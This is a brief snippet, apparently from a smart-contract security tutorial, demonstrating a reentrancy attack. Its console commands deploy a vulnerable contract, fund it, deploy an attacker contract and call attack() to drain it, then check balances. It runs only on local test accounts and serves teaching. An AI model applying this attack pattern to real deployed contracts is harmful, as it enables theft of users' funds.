## Reentrancy
Basic example of stealing funds using reentrancy.

```
v = Reentrancy.deploy({'from': accounts[0]})
v.deposit({'from': accounts[0], 'value': 1000000000000000000})
a = ReentrancyAttacker.deploy(v.address,{'from': accounts[3]})
s = a.attack({'from': accounts[2]})
s.call_trace()
a.balance()
v.balance()
```
